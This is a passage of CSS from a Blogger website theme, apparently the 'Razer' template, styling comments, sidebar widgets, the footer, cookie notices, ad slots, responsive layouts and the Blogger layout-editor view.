.comments .comment-header .icon.blog-author:before{content:'\f058';font-family:'Font Awesome 5 Free';font-weight:400}
.comments .comment-header .datetime{display:block;margin:0}
.comment-header .datetime a{font-family:var(--meta-font);font-size:12px;color:var(--meta-color);font-weight:400;padding:0}
.comments .comment-actions{display:block;margin:10px 0 0}
.comments .comment-actions a{display:inline-block;font-size:14px;color:var(--main-color);font-weight:400;font-style:normal;padding:0;margin:0 15px 0 0}
.rtl .comments .comment-actions a{margin:0 0 0 15px}
.comments .comment-actions a:hover{color:var(--title-color)}
.item-control{display:none}
.loadmore.loaded a{display:inline-block;border-bottom:1px solid rgba(155,155,155,.51);text-decoration:none;margin-top:15px}
.comments .continue{display:none}
.comments .comment-replies{padding:0 0 0 48px}
.rtl .comments .comment-replies{padding:0 48px 0 0}
.loadmore,.thread-expanded .thread-count a{display:none}
.comments .footer{float:left;width:100%;font-size:13px;margin:0}
.comment-form{float:left;width:100%;margin:0}
p.comments-message{display:block;float:left;width:100%;font-size:14px;color:var(--meta-color);font-style:italic;padding:0 0 20px;margin:0 0 20px;border-bottom:1px solid var(--border-color)}
p.comments-message.no-new-comments{padding:0;margin:0;border:0}
p.comments-message>a{color:var(--main-color)}
p.comments-message>a:hover{color:var(--title-color)}
p.comments-message>em{color:#ff3f34;font-style:normal;margin:0 3px}
#comments[data-embed=false] p.comments-message>i{color:var(--main-color);font-style:normal}
.comment-form>p{display:none}
.comment-content .responsive-video-wrap{position:relative;width:100%;padding:0;padding-top:56%}
.comment-content .responsive-video-wrap iframe{position:absolute;top:0;left:0;width:100%;height:100%}
.comments #top-ce.comment-replybox-thread{padding:15px 0 0;margin:20px 0 0;border-top:1px solid var(--border-color)}
.comments #top-continue a{float:left;width:100%;height:34px;background-color:var(--button-bg);font-size:14px;color:var(--button-color);font-weight:400;line-height:34px;text-align:center;padding:0;margin:25px 0 0;border-radius:var(--border-radius)}
.comments #top-continue a:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.post-nav{float:left;width:100%;display:flex;flex-wrap:wrap;justify-content:space-between;font-family:var(--meta-font);font-size:14px;font-weight:400;margin:25px 0 0}
.post-nav a,.post-nav span{display:flex;align-items:center;color:var(--meta-color)}
.post-nav a:hover{color:var(--main-color)}
.post-nav span{color:var(--meta-color);cursor:no-drop;opacity:.65}
.post-nav-newer-link:before,.rtl .post-nav-older-link:after{content:'\f053';font-family:'Font Awesome 5 Free';font-size:9px;font-weight:900;margin:1px 4px 0 0}
.post-nav-older-link:after,.rtl .post-nav-newer-link:before{content:'\f054';font-family:'Font Awesome 5 Free';font-size:9px;font-weight:900;margin:1px 0 0 4px}
#custom-ads,#razer-pro-post-footer-ads{position:relative;float:left;width:100%;opacity:0;visibility:hidden;padding:0;margin:0;border:0}
#custom-ads{padding:0 20px}
#after-ad,#before-ad{float:left;width:100%;margin:0}
#after-ad .widget>.widget-title,#before-ad .widget>.widget-title{display:block}
#after-ad .widget>.widget-title>.title,#before-ad .widget>.widget-title>.title{font-size:10px;color:var(--meta-color);font-weight:400;line-height:1;margin:0 0 8px}
#after-ad .widget,#before-ad .widget{width:100%;margin:0 0 20px}
#after-ad .widget{margin:20px 0 0}
#after-ad .widget-content,#before-ad .widget-content{position:relative;width:100%}
#razer-pro-new-after-ad #after-ad,#razer-pro-new-before-ad #before-ad{float:none;display:block;margin:0}
#razer-pro-new-after-ad #after-ad .widget,#razer-pro-new-before-ad #before-ad .widget{margin:0}
#blog-pager{position:relative;float:left;width:100%;padding:0 20px;margin:0;border-top:1px solid var(--border-color)}
.no-posts #blog-pager{display:none}
#blog-pager .load-more{position:relative;display:flex;height:36px;font-size:13px;color:var(--main-color);font-weight:500;text-transform:uppercase;align-items:center;justify-content:center}
#blog-pager #razer-pro-load-more-link{cursor:pointer}
#blog-pager #razer-pro-load-more-link:hover{color:var(--title-color)}
#blog-pager .no-more.show{display:flex;color:var(--meta-color);font-weight:400;cursor:not-allowed}
#blog-pager .loading,#blog-pager .no-more{display:none}
#blog-pager .loading .loader{height:36px}
#blog-pager .loading .loader:after{width:24px;height:24px;margin:0}
#post-footer-ads{position:relative;float:left;width:100%;padding:0;margin:25px 0 0}
#post-footer-ads .widget,#post-footer-ads .widget-content{float:left;width:100%}
.sidebar{position:relative;float:left;width:100%;margin:0}
.sidebar>.widget{position:relative;float:left;width:100%;background-color:var(--widget-bg);margin:0 0 25px;box-shadow:var(--widget-shadow)}
.sidebar>.widget:last-child{margin:0}
.sidebar .widget-content{position:relative;float:left;width:100%;padding:20px;margin:0}
.sidebar .widget.no-style{background-color:transparent;border:0;box-shadow:none}
.sidebar .widget.no-style>.widget-title{display:none}
.sidebar .widget.no-style .widget-content{padding:0}
.sidebar ul.social-icons{display:grid;grid-template-columns:repeat(2,1fr);grid-gap:5px;margin:0}
.sidebar .social-icons li{display:block;margin:0}
.sidebar .social-icons a{position:relative;display:flex;height:34px;font-size:16px;color:#fff;font-weight:400;align-items:center}
.sidebar .social-icons a:before{padding:0 10px}
.sidebar .social-icons span{font-size:14px;line-height:1;padding:0 10px;border-left:1px solid rgba(255,255,255,.2)}
.rtl .sidebar .social-icons span{border-left:0;border-right:1px solid rgba(255,255,255,.2)}
.sidebar .social-icons a:hover{opacity:.9}
.sidebar .loader{height:180px}
.default-items{display:flex;flex-direction:column}
.default-items .default-item{position:relative;display:flex;margin:20px 0 0}
.default-items .default-item.item-0{height:170px;flex-direction:column;margin:0}
.default-items .entry-image-wrap{width:100px;height:65px;z-index:1;margin:0 13px 0 0}
.rtl .default-items .default-item:not(.item-0) .entry-image-wrap{margin:0 0 0 13px}
.default-items .default-item.item-0 .entry-image-wrap{width:100%;height:100%;margin:0}
.default-items .default-item:not(.item-0) .entry-image-wrap.is-video:after{transform:translate(50%,-50%) scale(.75)}
.default-items .entry-header{display:flex;flex-direction:column}
.default-items .default-item:not(.item-0) .entry-header{flex:1}
.default-items .entry-title{font-size:15px}
.default-items .item-0 .entry-title{font-size:20px}
.default-items .item-0 .entry-meta{flex-wrap:wrap}
.mini-items{position:relative;float:left;width:100%;display:grid;grid-template-columns:repeat(2,1fr);grid-gap:20px}
.mini-item{position:relative;display:flex;flex-direction:column}
.mini-item .entry-image-wrap{width:100%;height:84px;margin:0 0 8px}
.mini-item .entry-image-wrap.is-video:after{transform:translate(50%,-50%) scale(.85)}
.mini-item .entry-title{font-size:15px}
.cmm1-items{display:flex;flex-direction:column}
.cmm1-items .cmm1-item{position:relative;width:100%;padding:20px 0 0;margin:20px 0 0;border-top:1px solid var(--border-color)}
.cmm1-items .cmm1-item.item-0{padding:0;margin:0;border:0}
.cmm1-items .entry-inner{display:flex}
.cmm1-items .entry-image-wrap{width:35px;height:35px;z-index:1;margin:0 13px 0 0;border-radius:50%;box-shadow:var(--avatar-shadow)}
.rtl .cmm1-items .entry-image-wrap{margin:0 0 0 13px}
.cmm1-items .entry-header{flex:1}
.cmm1-items .entry-title{font-size:15px}
.cmm1-items .entry-inner:hover .entry-title{color:var(--post-title-hover-color)}
.cmm1-items .cmm-snippet{font-size:12px;color:var(--text-color);margin:4px 0 0}
.FeaturedPost .featured-post{position:relative;width:100%;height:170px;display:flex;flex-direction:column;margin:0}
.featured-post .entry-image-wrap{width:100%;height:100%;z-index:1;margin:0}
.featured-post .entry-title{font-size:20px}
.featured-post .entry-meta{flex-wrap:wrap}
.FollowByEmail .follow-by-email-title{display:block;font-family:var(--title-font);font-size:18px;color:var(--widget-title-color);margin:0 0 10px}
.FollowByEmail .follow-by-email-text{display:block;font-size:14px;margin:0 0 15px}
.FollowByEmail .follow-by-email-address{width:100%;height:34px;background-color:rgba(155,155,155,.05);font-family:inherit;font-size:14px;color:var(--text-color);padding:0 13px;margin:0 0 10px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.FollowByEmail .follow-by-email-address::placeholder{color:var(--text-color);opacity:.75}
.FollowByEmail .follow-by-email-address:focus{color:var(--text-color)}
.FollowByEmail .follow-by-email-submit{width:100%;height:34px;background-color:var(--button-bg);font-family:inherit;font-size:14px;color:var(--button-color);font-weight:400;cursor:pointer;padding:0 20px;border:0;border-radius:var(--border-radius)}
.FollowByEmail .follow-by-email-submit:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.razer-pro-widget-ready .list-style li{position:relative;display:block;font-size:14px;color:var(--title-color);font-weight:400}
.razer-pro-widget-ready .list-style li a{display:block;color:var(--title-color);padding:8px 0}
.razer-pro-widget-ready .list-style li a.has-count{display:flex;justify-content:space-between}
.razer-pro-widget-ready .list-style li:first-child a{padding:0 0 8px}
.razer-pro-widget-ready .list-style li:last-child a{padding:8px 0 0}
.razer-pro-widget-ready .list-style li a:hover{color:var(--title-hover-color)}
.razer-pro-widget-ready .list-style li a span{display:inline-block;color:var(--main-color)}
.razer-pro-widget-ready .text-list li{padding:8px 0}
.razer-pro-widget-ready .text-list li:first-child{padding:0 0 8px}
.razer-pro-widget-ready .text-list li:last-child{padding:8px 0 0}
.cloud-label ul{display:flex;flex-wrap:wrap;margin:-8px 0 0}
.cloud-label li{margin:8px 6px 0 0}
.rtl .cloud-label li{margin:8px 0 0 6px}
.cloud-label li a{display:flex;height:29px;background-color:var(--button-lite-bg);color:var(--button-bg);font-size:13px;line-height:29px;font-weight:400;padding:0 13px}
.is-dark .cloud-label li a{background-color:rgba(155,155,155,.05);color:var(--text-color)}
.cloud-label li a:hover{background-color:var(--button-bg);color:var(--button-color)}
.cloud-label .label-count{display:inline-block;margin:0 0 0 10px}
.rtl .cloud-label .label-count{margin:0 10px 0 0}
.search-widget .search-form{float:left;width:100%;display:flex;margin:0}
.search-widget .search-input{display:inline-block;flex:1;width:100%;height:34px;background-color:rgba(155,155,155,.05);font-family:inherit;font-weight:400;font-size:14px;color:var(--text-color);padding:0 13px;margin:0;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.search-widget .search-input::placeholder{color:var(--text-color);opacity:.9}
.search-widget .search-input:focus{outline:0}
.search-widget .search-action{display:inline-block;width:38px;height:34px;background-color:var(--button-bg);font-family:inherit;font-size:14px;color:var(--button-color);font-weight:400;line-height:34px;cursor:pointer;padding:0;margin:0 0 0 5px;border:0;border-radius:var(--border-radius)}
.rtl .search-widget .search-action{margin:0 5px 0 0}
.search-widget .search-action:before{display:block;content:'\f002';font-family:'Font Awesome 5 Free';font-weight:900}
.search-widget .search-action:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.Profile ul li{float:left;width:100%;padding:20px 0 0;margin:20px 0 0;border-top:1px solid var(--border-color)}
.Profile ul li:first-child{padding:0;margin:0;border:0}
.Profile .individual,.Profile .team-member{display:flex}
.Profile .profile-img{width:35px;height:35px;background-color:rgba(155,155,155,.05);overflow:hidden;color:transparent!important;margin:0 13px 0 0;border-radius:50%;box-shadow:var(--avatar-shadow)}
.rtl .Profile .profile-img{margin:0 0 0 13px}
.Profile .profile-info{flex:1}
.Profile .profile-name{display:block;font-family:var(--title-font);font-size:15px;color:var(--title-color);font-weight:700;margin:0}
.Profile .profile-name:hover{color:var(--title-hover-color)}
.Profile .profile-link{display:block;font-size:12px;color:var(--meta-color);font-weight:400;margin:0}
.Profile .profile-link:hover{color:var(--main-color)}
.Text .widget-content{font-family:var(--text-font);font-size:14px;color:var(--text-color);margin:0}
.Image .image-caption{display:block;font-size:14px;color:var(--text-color);margin:6px 0 0}
.contact-form-widget form{font-family:inherit;font-weight:400}
.contact-form-name{float:left;width:100%;height:34px;background-color:transparent;font-family:inherit;font-size:14px;color:var(--text-color);line-height:34px;padding:0 15px;margin:0 0 10px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.contact-form-email{float:left;width:100%;height:34px;background-color:transparent;font-family:inherit;font-size:14px;color:var(--text-color);line-height:34px;padding:0 15px;margin:0 0 10px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.contact-form-email.error{border-color:var(--main-color)}
.contact-form-email-message{float:left;width:100%;background-color:transparent;font-family:inherit;font-size:14px;color:var(--text-color);padding:10px 15px;margin:0 0 10px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.contact-form-email-message.error{border-color:var(--main-color)}
.contact-form-button-submit{float:left;width:100%;height:34px;background-color:var(--button-bg);font-family:inherit;font-size:14px;color:var(--button-color);font-weight:400;cursor:pointer;padding:0 20px;border:0;border-radius:var(--border-radius)}
.contact-form-button-submit:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.contact-form-widget p{margin:0}
.contact-form-widget p.contact-form-error-message-with-border,p.contact-form-success-message-with-border{float:left;width:100%;background-color:rgba(0,0,0,0);font-size:13px;color:#e74c3c;text-align:left;line-height:1;padding:0;margin:10px 0 0;border:0}
.contact-form-widget .contact-form-success-message-with-border{color:#27ae60}
.rtl .contact-form-error-message-with-border,.rtl .contact-form-success-message-with-border{text-align:right}
.contact-form-cross{cursor:pointer;margin:0 0 0 3px}
.rtl .contact-form-cross{margin:0 3px 0 0}
.contact-form-email-message::placeholder,.contact-form-email::placeholder,.contact-form-name::placeholder{color:var(--text-color);opacity:.9}
.Attribution a{font-size:14px;line-height:16px;display:block}
.Attribution a>svg{width:16px;height:16px;float:left;margin:0 4px 0 0}
.Attribution .copyright{font-size:12px;color:var(--meta-color);padding:0 20px;margin:3px 0 0}
#google_translate_element{position:relative;float:left;width:100%;padding:20px;margin:0}
.Stats .text-counter-wrapper{display:flex;font-size:20px;color:var(--meta-color);font-weight:700;text-transform:uppercase;line-height:1;margin:0}
.Stats .text-counter-wrapper:before{content:'\f201';font-family:'Font Awesome 5 Free';color:var(--main-color);font-weight:900;margin:0 4px 0 0}
.rtl .Stats .text-counter-wrapper:before{margin:0 0 0 4px}
.sidebar>.widget.ReportAbuse{display:block;padding:15px 20px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.ReportAbuse>h3{display:flex;float:left;width:100%;font-size:14px;font-weight:400;margin:0}
.ReportAbuse>h3:before{content:'\f071';font-family:'Font Awesome 5 Free';color:var(--title-color);font-weight:900;margin:0 4px 0 0}
.rtl .ReportAbuse>h3:before{margin:0 0 0 4px}
.ReportAbuse>h3 a:hover{text-decoration:underline}
#footer-ads-wrap{position:relative;float:left;width:100%;margin:0}
.footer-ads .widget{position:relative;float:left;width:100%;text-align:center;line-height:0;margin:0 0 25px}
.footer-ads .widget-content{float:left;width:100%;margin:0}
.footer-ads .widget>.widget-title{display:none}
#footer-wrapper{position:relative;float:left;width:100%;background-color:var(--footer-bg);color:var(--footer-text-color);z-index:2;box-shadow:0 -1px 2px rgba(0,0,0,.025)}
#footer-wrapper .primary-footer{float:left;width:100%;margin:0}
.primary-footer.no-widget{display:none}
#razer-pro-about-section{position:relative;float:left;width:100%;display:flex;flex-wrap:wrap;justify-content:space-between;padding:30px 0;margin:0}
.primary-footer.has-border .razer-pro-about-section{border-bottom:1px solid var(--border-color)}
.footer-info{display:flex;flex-direction:column;flex:1}
.footer-info h3.title{font-size:16px;color:var(--footer-color);text-transform:uppercase;margin:0 0 10px}
.razer-pro-about-section .Image{width:calc(100% - $(sidebar.width + 25px));display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;padding:0}
.razer-pro-about-section .footer-logo{padding:0 25px 0 0}
.rtl .razer-pro-about-section .footer-logo{padding:0 0 0 25px}
.razer-pro-about-section .footer-logo img{display:block;max-height:34px;margin:0}
.razer-pro-about-section .Image .image-caption{font-size:14px;color:var(--footer-text-color);margin:0}
.razer-pro-about-section .Image .image-caption a{color:var(--footer-color)}
.razer-pro-about-section .Image .image-caption a:hover{color:var(--footer-hover-color)}
.razer-pro-about-section .LinkList{width:$(sidebar.width);display:flex;align-items:center;justify-content:flex-end;margin:0}
.razer-pro-about-section ul.social-icons{display:flex;flex-wrap:wrap}
.razer-pro-about-section .social-icons li{margin:0 0 0 10px}
.rtl .razer-pro-about-section .social-icons li{margin:0 10px 0 0}
.razer-pro-about-section .social-icons li a{display:block;width:34px;height:34px;background-color:rgba(155,155,155,.05);font-size:16px;color:var(--footer-color);text-align:center;line-height:34px}
.razer-pro-about-section .social-icons li a:hover{color:#fff}
.footerbar{position:relative;float:left;width:100%;height:58px;background-color:var(--footerbar-bg);color:var(--footerbar-color);display:flex;align-items:center}
.footerbar .container{display:flex;flex-wrap:wrap;justify-content:space-between}
.footerbar .footer-copyright{font-size:14px;font-weight:400;margin:0}
.footerbar .footer-copyright a{color:var(--footerbar-color)}
.footerbar .footer-copyright a:hover{color:var(--footerbar-hover-color)}
#footer-menu{position:relative;display:block;margin:0}
.footer-menu ul{display:flex;flex-wrap:wrap}
.footer-menu ul li a{font-size:14px;color:var(--footerbar-color);padding:0;margin:0 0 0 25px}
.rtl .footer-menu ul li a{margin:0 25px 0 0}
#footer-menu ul li a:hover{color:var(--footerbar-hover-color)}
#hidden-widgets-wrap,.hidden-widgets{display:none;visibility:hidden}
#back-top{display:none;position:fixed;bottom:20px;right:20px;width:34px;height:34px;background-color:var(--button-bg);cursor:pointer;overflow:hidden;font-size:15px;color:var(--button-color);text-align:center;line-height:34px;z-index:50;margin:0;transition:background .17s ease,color .17s ease}
.rtl #back-top{right:auto;left:20px}
#back-top:before{content:'\f077';position:relative;font-family:'Font Awesome 5 Free';font-weight:900}
#back-top:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.is-error #main-wrapper{width:100%}
.is-error #sidebar-wrapper{display:none}
.errorWrap{color:var(--title-color);text-align:center;padding:60px 0}
.errorWrap h3{font-size:160px;color:var(--title-color);line-height:1;margin:0 0 25px}
.errorWrap h4{font-size:27px;color:var(--title-color);margin:0 0 25px}
.errorWrap p{color:var(--text-color);font-size:14px;margin:0 0 15px}
.errorWrap a{display:inline-block;height:34px;background-color:var(--button-bg);font-size:14px;color:var(--button-color);font-weight:400;line-height:34px;padding:0 30px;margin:15px 0 0;border-radius:var(--border-radius)}
.errorWrap a:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.cookie-choices-info{display:none;visibility:hidden;opacity:0}
#razer-pro-cookie-ify{display:none;position:fixed;bottom:20px;left:20px;width:300px;background-color:var(--cookie-bg);z-index:1020;padding:20px;visibility:hidden;opacity:0;box-shadow:0 2px 6px rgba(0,0,0,.1);transition:all .35s ease}
.rtl #razer-pro-cookie-ify{left:unset;right:20px}
#razer-pro-cookie-ify.is-visible{visibility:visible;opacity:1}
.razer-pro-cookie-ify-content{display:block;font-size:14px;color:var(--cookie-color);margin:0 0 15px}
.razer-pro-cookie-ify-content a{color:var(--cookie-color);text-decoration:underline}
.razer-pro-cookie-ify-content a:hover{color:var(--main-color)}
#razer-pro-cookie-ify-accept{display:inline-block;height:34px;background-color:var(--button-bg);font-size:14px;color:var(--button-color);font-weight:400;line-height:34px;padding:0 20px}
#razer-pro-cookie-ify-accept:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
ins.adsbygoogle-noablate[data-anchor-shown=true]{z-index:990!important}
a.ads-here{position:relative;display:flex;align-items:center;justify-content:center;height:78px;background-color:var(--widget-bg);font-size:15px;color:rgba(155,155,155,.5);font-weight:600;font-style:italic;margin:0;box-shadow:var(--widget-shadow)}
.item-post-inner a.ads-here{background-color:var(--outer-bg);box-shadow:none}
.sidebar a.ads-here{height:250px}
a.ads-here:hover{color:rgba(155,155,155,.65)}
@media only screen and (max-width:$(row.width + 30px)){#outer-wrapper,.is-boxed #outer-wrapper,.is-boxed .main-nav-flex{width:100%;max-width:100%;margin:0}
.row-x1{width:100%;max-width:100%}
#content-wrapper>.container,#featured-wrap>.container,#footer-ads-wrap>.container,#footer-wrapper .container,#header-ads-wrap>.container,#header-wrapper .container,#home-ads-wrap>.container{padding:0 15px}
#razer-pro-cookie-ify{left:15px;bottom:15px;padding:20px}
.rtl #razer-pro-cookie-ify{left:unset;right:15px}
}
@media only screen and (max-width:980px){#header-wrapper .container{padding:0}
.mobile-menu-toggle{display:flex}
.header-items{flex-wrap:nowrap}
#razer-pro-main-nav,.topbar-wrap{display:none!important}
#slide-menu,.overlay{display:block}
.flex-right,.rtl .flex-right{position:relative;top:unset;left:unset;right:unset}
.main-search .search-form{padding:0 15px}
.nav-active .overlay{visibility:visible;opacity:1}
.nav-active #back-top{opacity:0!important}
#content-wrapper>.container,.is-left #content-wrapper>.container{flex-direction:column!important;justify-content:flex-start}
#main-wrapper,#sidebar-wrapper{width:100%}
#sidebar-wrapper{margin:25px 0 0}
}
@media only screen and (max-width:880px){#razer-pro-about-section{flex-wrap:wrap;flex-direction:column}
.razer-pro-about-section .Image{width:100%;flex-direction:column;justify-content:center;text-align:center}
.razer-pro-about-section .footer-logo,.rtl .razer-pro-about-section .footer-logo{padding:0}
.footer-info{text-align:center;margin:25px 0 0}
.razer-pro-about-section .LinkList{width:100%;justify-content:center;margin:15px 0 0}
.razer-pro-about-section ul.social-icons{justify-content:center}
.razer-pro-about-section .social-icons li,.rtl .razer-pro-about-section .social-icons li{margin:10px 5px 0}
.footerbar{height:auto;line-height:inherit;padding:25px 0;margin:0}
.footerbar .container{flex-direction:column;justify-content:center}
#footer-menu,.footerbar .footer-copyright{width:100%;text-align:center;margin:0}
#footer-menu{padding:10px 0 0}
.footer-menu ul{justify-content:center}
.footer-menu ul li a,.rtl .footer-menu ul li a{display:block;margin:5px 10px 0}
#back-top{right:15px;bottom:15px}
.rtl #back-top{left:15px;right:unset}
}
@media only screen and (max-width:780px){.featured-cards{grid-template-columns:repeat(2,1fr);grid-gap:2px}
.featured-cards .featured-item{height:250px}
.featured-cards .featured-item.card-style.item-0{height:320px;grid-column:1/3;grid-row:auto}
.featured-cards .featured-item .entry-title{font-size:25px}
.block1-left .block1-item{height:250px}
.content-section .widget.column-style{width:100%}
.col-items .col-item.item-0{height:220px}
.grid1-items{grid-template-columns:repeat(2,1fr)}
.grid1-item .entry-image-wrap{height:150px}
.grid1-item .entry-title{font-size:17px}
.grid2-items{grid-gap:20px}
.grid2-item .entry-meta .entry-author,.grid2-item .entry-meta .sp{display:none}
.default-items .default-item.item-0{height:220px}
.default-items .item-0 .entry-title{font-size:22px}
.mini-item .entry-image-wrap{height:150px}
.mini-item .entry-title{font-size:17px}
.mini-item .entry-image-wrap.is-video:after{transform:translate(50%,-50%) scale(1)}
.FeaturedPost .featured-post{height:220px}
.featured-post .entry-title{font-size:22px}
.related-posts{grid-template-columns:repeat(2,1fr)}
.related-posts .entry-image-wrap{height:150px}
.related-posts .entry-title{font-size:17px}
}
@media only screen and (max-width:680px){#content-wrapper>.container,#featured-wrap>.container,#footer-ads-wrap>.container,#header-ads-wrap>.container,#home-ads-wrap>.container{padding:0 10px}
.video-items{grid-template-columns:repeat(2,1fr)}
.index-post{flex-direction:column;justify-content:flex-start}
.index-post .entry-image-wrap{width:100%;height:220px;margin:0 0 12px!important}
.index-post .entry-excerpt{font-size:14px}
.item-post h1.entry-title{font-size:33px}
.post-body table{display:block}
.razer-pro-share-links a.twitter span{display:none}
.razer-pro-share-links li.has-span a.twitter{width:34px;justify-content:center}
.razer-pro-share-links li.has-span a.twitter:before{background-color:transparent;padding:0}
.errorWrap{padding:25px 0 45px}
.errorWrap h3{font-size:130px}
#razer-pro-cookie-ify{right:0!important;left:0!important;bottom:0;width:100%;transform:translate(0,50%);padding:20px;margin:0}
#razer-pro-cookie-ify.is-visible{transform:translate(0,0)}
#back-top{right:10px;bottom:10px}
.rtl #back-top{left:10px;right:unset}
a.ads-here{height:65px}
.sidebar a.ads-here{height:200px}
}
@media only screen and (max-width:480px){#featured .widget-content{min-height:200px}
.featured-cards{grid-template-columns:1fr;grid-gap:2px}
.featured-cards .featured-item{height:200px}
.featured-cards .featured-item.card-style.item-0{height:180px;grid-column:auto;grid-row:auto}
.featured-cards .featured-item .entry-title,.featured-cards .featured-item.card-style.item-0 .entry-title{font-size:18px}
.block1-left .entry-excerpt,.featured-item .entry-excerpt{display:none}
.block1-left .block1-item{height:220px}
.block1-right{grid-template-columns:1fr}
.block1-right .entry-title{font-size:16px}
.grid1-item .entry-image-wrap{height:110px}
.grid1-item .entry-title{font-size:16px}
.col-items .col-item.item-0{height:200px}
.col-items .col-item:not(.item-0) .entry-image-wrap{width:120px;height:76px}
.col-items .col-item:not(.item-0) .entry-title{font-size:16px}
.video-items{grid-template-columns:1fr}
.grid2-items{grid-template-columns:1fr}
.grid2-item .entry-title{font-size:18px}
.block2-item{flex-direction:column;justify-content:flex-start}
.block2-item.item-0{height:200px}
.block2-item:not(.item-0) .entry-image-wrap{height:200px;width:100%;margin:0 0 12px}
.block2-item.item-0 .entry-title{font-size:20px}
.index-post .entry-image-wrap{height:200px}
#post-body,.author-description .author-text,.comments .comment-content{font-size:$(itempost.content.size + 1px)}
.item-post h1.entry-title{font-size:29px}
.related-posts .entry-image-wrap{height:110px}
.related-posts .entry-title{font-size:16px}
.default-items .default-item.item-0{height:200px}
.default-items .default-item:not(.item-0) .entry-image-wrap{width:120px;height:76px}
.default-items .default-item:not(.item-0) .entry-title{font-size:16px}
.mini-item .entry-image-wrap{height:110px}
.mini-item .entry-title{font-size:16px}
.FeaturedPost .featured-post{height:200px}
}
@media only screen and (max-width:380px){#featured .widget-content{min-height:180px}
.featured-cards .featured-item{height:180px}
.featured-cards .featured-item .entry-title,.featured-cards .featured-item.card-style.item-0 .entry-title{font-size:15px}
.block1-left .block1-item{height:180px}
.block1-left .entry-title{font-size:21px}
.block1-right .entry-title{font-size:15px}
.grid1-item .entry-image-wrap{height:90px}
.grid1-item .entry-title{font-size:15px}
.col-items .col-item.item-0{height:180px}
.col-items .item-0 .entry-title{font-size:21px}
.col-items .col-item:not(.item-0) .entry-image-wrap{width:100px;height:65px}
.col-items .col-item:not(.item-0) .entry-title{font-size:15px}
.grid2-item .entry-title{font-size:16px}
.block2-item.item-0{height:180px}
.block2-item.item-0 .entry-title{font-size:21px}
.block2-item:not(.item-0) .entry-image-wrap{height:180px}
.block2-item:not(.item-0) .entry-title{font-size:18px}
.block2-item .entry-excerpt{display:none}
.index-post .entry-image-wrap{height:180px}
.item-post h1.entry-title{font-size:25px}
.item-post .entry-meta .align-right{display:none}
.tocify-inner{min-width:100%}
.razer-pro-share-links span{display:none}
.razer-pro-share-links li.has-span a{width:34px;justify-content:center}
.razer-pro-share-links li.has-span a:before{background-color:transparent;padding:0}
.related-posts .entry-image-wrap{height:90px}
.related-posts .entry-title{font-size:15px}
.default-items .default-item.item-0{height:180px}
.default-items .item-0 .entry-title{font-size:21px}
.default-items .default-item:not(.item-0) .entry-image-wrap{width:100px;height:65px}
.default-items .default-item:not(.item-0) .entry-title{font-size:15px}
.mini-item .entry-image-wrap{height:90px}
.mini-item .entry-title{font-size:15px}
.FeaturedPost .featured-post{height:180px}
.featured-post .entry-title{font-size:21px}
}
@media only screen and (max-width:340px){#slide-menu{width:100%}
.errorWrap h3{font-size:110px}
.errorWrap h4{font-size:25px}
}
]]></b:skin>
</b:if>
<b:if cond='data:view.isLayoutMode'>
<b:template-skin><![CDATA[
body#layout #outer-wrapper,body#layout .row,html{width:auto;padding:0}
body#layout{position:relative;width:auto;max-width:100%;background-color:#f9f9f9;padding:95px 5px 0;margin:0}
body#layout:before{content:'Razer - v1.0 Paid by MrJaz.com';position:absolute;top:0;left:5px;right:5px;height:95px;font-family:Roboto,sans-serif;font-size:20px;color:#0f1618;line-height:95px;text-align:center}
body#layout div.section{display:block;background-color:#f1f1f1!important;margin:0 5px 10px!important;padding:16px 16px 18px!important;border-color:#e5e5e5}
body#layout .no-items.section{display:block}
body#layout .section h4{font-size:14px;color:#0f1618;text-transform:uppercase;margin:0}
body#layout .section h4:after{text-transform:initial;color:#656565;font-weight:400}
body#layout .add_widget a{color:#3c97ef!important}
body#layout .widget-wrap3{overflow:hidden}
body#layout .widget-content{width:auto;max-width:none;max-height:none;margin:0;border:1px solid #e5e5e5;border-left:0}
body#layout .locked-widget .widget-content{border-left:1px solid #3c97ef}
body#layout .locked-widget .widget-content:hover{border-left-color:#00b140}
body#layout .widget .widget-content a.editlink{border-radius:2px}
body#layout .visibility .editlink{background:#3c97ef url(https://1.bp.blogspot.com/-iQoCOwqjB-w/Wy1bDznOM4I/AAAAAAAACGA/8BUOPStr0sk5oud9hWpHBQTrmkeJDoAvACK4BGAYYCw/s18-c/mode_edit_w600_24dp.png) no-repeat center!important}
body#layout .visibility .editlink:hover{background-color:#00b140!important}
body#layout .draggable-widget .widget-wrap2{background:#3c97ef url(https://1.bp.blogspot.com/-yTAuT5aZ1EY/Wy1eEeo4SbI/AAAAAAAACGM/FxOTPwL-Ch0_lyZxLRzhv2EWHINOmCjWACK4BGAYYCw/s22/draggable.png) no-repeat 4px 50%!important}
body#layout .draggable-widget .widget-wrap1:hover .widget-wrap2{background-color:#00b140!important}
body#layout .visibility .layout-widget-state.visible{background-image:url(https://4.bp.blogspot.com/-qicweZaCb7I/XR_IGBqqGfI/AAAAAAAABS0/MIpI_COKj6MBkeN9FEJhqL96WYnYfGjngCK4BGAYYCw/s1600/visibility_c3_600_24dp.png)!important}
body#layout .visibility .layout-widget-state.not-visible{background-image:url(https://4.bp.blogspot.com/-tqL3-mrEM7A/XR_H_P3mFZI/AAAAAAAABSs/4PO1g3CDQbse_mJYzwn-60OQoYMFcq1FQCK4BGAYYCw/s1600/visibility_off_c3_600_24dp.png)!important;opacity:1}
body#layout div.layout-widget-description{display:none;font-size:11px;line-height:1.2em}
body#layout #main-menu .widget,body#layout #theme-options{display:block!important}
body#layout div.ify-panel{background-color:#edf4ff!important;overflow:hidden!important;border-color:#cdd4ef}
body#layout .ify-panel .widget{float:left;width:32.66%;margin-right:1%}
body#layout .ify-panel .widget-content{border-color:#cdd4ef!important}
body#layout .ify-panel .HTML{margin-right:0}
body#layout #nav-search-wrap,body#layout .flex-right,body#layout .ify-panel div.layout-widget-description{display:none}
